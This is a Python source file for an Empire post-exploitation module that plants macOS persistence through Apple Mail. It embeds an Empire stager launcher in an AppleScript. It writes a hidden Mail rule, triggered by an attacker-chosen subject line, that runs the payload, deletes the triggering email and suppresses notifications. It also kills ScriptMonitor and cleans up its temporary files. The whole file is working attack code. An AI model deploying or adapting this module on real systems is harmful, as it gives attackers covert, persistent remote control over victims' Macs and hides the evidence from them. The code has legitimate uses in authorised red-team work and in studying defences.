from random import choice
from string import ascii_uppercase
from time import time

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        rule_name = params["RuleName"]
        trigger = params["Trigger"]
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["SafeChecks"]
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            user_agent=user_agent,
            safe_checks=safe_checks,
        )
        launcher = launcher.replace('"', '\\"')
        launcher = launcher.replace('"', '\\"')
        launcher = f'do shell script "{launcher}"'
        hex = "0123456789ABCDEF"

        def UUID():
            return (
                "".join([choice(hex) for x in range(8)])
                + "-"
                + "".join([choice(hex) for x in range(4)])
                + "-"
                + "".join([choice(hex) for x in range(4)])
                + "-"
                + "".join([choice(hex) for x in range(4)])
                + "-"
                + "".join([choice(hex) for x in range(12)])
            )

        criterion_unique_id = UUID()
        RuleId = UUID()
        time_stamp = str(int(time()))[0:9]
        synced_rules = "/tmp/" + "".join(choice(ascii_uppercase) for i in range(12))
        rules_active_state = "/tmp/" + "".join(
            choice(ascii_uppercase) for i in range(12)
        )
        apple_script = "".join(choice(ascii_uppercase) for i in range(12)) + ".scpt"
        plist = (
            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <array>
        <dict>
                <key>AllCriteriaMustBeSatisfied</key>
                <string>NO</string>
                <key>AppleScript</key>
                <string>"""
            + apple_script
            + """</string>
                <key>AutoResponseType</key>
                <integer>0</integer>
                <key>Criteria</key>
                <array>
                    <dict>
                        <key>CriterionUniqueId</key>
                        <string>"""
            + criterion_unique_id
            + """</string>
                        <key>Expression</key>
                        <string>"""
            + str(trigger)
            + """</string>
                        <key>Header</key>
                        <string>Subject</string>
                    </dict>
                </array>
                <key>Deletes</key>
                <string>YES</string>
                <key>HighlightTextUsingColor</key>
                <string>NO</string>
                <key>MarkFlagged</key>
                <string>NO</string>
                <key>MarkRead</key>
                <string>NO</string>
                <key>NotifyUser</key>
                <string>NO</string>
                <key>RuleId</key>
                <string>"""
            + RuleId
            + """</string>
                <key>RuleName</key>
                <string>"""
            + str(rule_name)
            + """</string>
                <key>SendNotification</key>
                <string>NO</string>
                <key>ShouldCopyMessage</key>
                <string>NO</string>
                <key>ShouldTransferMessage</key>
                <string>NO</string>
                <key>TimeStamp</key>
                <integer>"""
            + time_stamp
            + """</integer>
                <key>Version</key>
                <integer>1</integer>
            </dict>
        </array>
        </plist>"""
        )
        plist2 = (
            """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>"""
            + RuleId
            + """</key>
            <true/>
        </dict>
        </plist>
            """
        )
        return f"""
import os
home =  os.getenv("HOME")
AppleScript = '{apple_script}'
SyncedRules = '{synced_rules}'
RulesActiveState = '{rules_active_state}'
plist = \"\"\"{plist}\"\"\"
plist2 = \"\"\"{plist2}\"\"\"
payload = \'\'\'{launcher}\'\'\'
payload = payload.replace('&\"', '& ')
payload += "kill `ps -ax | grep ScriptMonitor |grep -v grep |  awk \'{{print($1)}}\'`"
payload += '\"'
script = home + "/Library/Application Scripts/com.apple.mail/" + AppleScript

os.system("touch " + SyncedRules)
with open(SyncedRules, 'w+') as f:
    f.write(plist)
    f.close()

os.system("touch " + RulesActiveState)
with open(RulesActiveState, 'w+') as f:
    f.write(plist2)
    f.close()

with open(script, 'w+') as f:
    f.write(payload)
    f.close()

with open("/System/Library/CoreServices/SystemVersion.plist", 'r') as a:
            v = a.read()
            version = "V1"
            if "10.7" in v:
                version = "V2"
            if "10.7" in v:
                version = "V2"
            if "10.8" in v:
                version = "V2"
            if "10.9" in v:
                version = "V2"
            if "10.10" in v:
                version = "V2"
            if "10.11" in v:
                version = "V3"
            if "10.12" in v:
                version = "V4"
            a.close()

if os.path.isfile(home + "/Library/Mobile Documents/com~apple~mail/Data/" + version + "/MailData/ubiquitous_SyncedRules.plist"):
    print("Trying to write to Mobile")
    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\\ Documents/com~apple~mail/Data/" + version + "/MailData/ubiquitous_SyncedRules.plist")
else:
    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mail/" + version + "/MailData/SyncedRules.plist")
    print("Writing to main rules")

os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/" + version + "/MailData/RulesActiveState.plist")
os.system("rm " + SyncedRules)
os.system("rm " + RulesActiveState)
        """
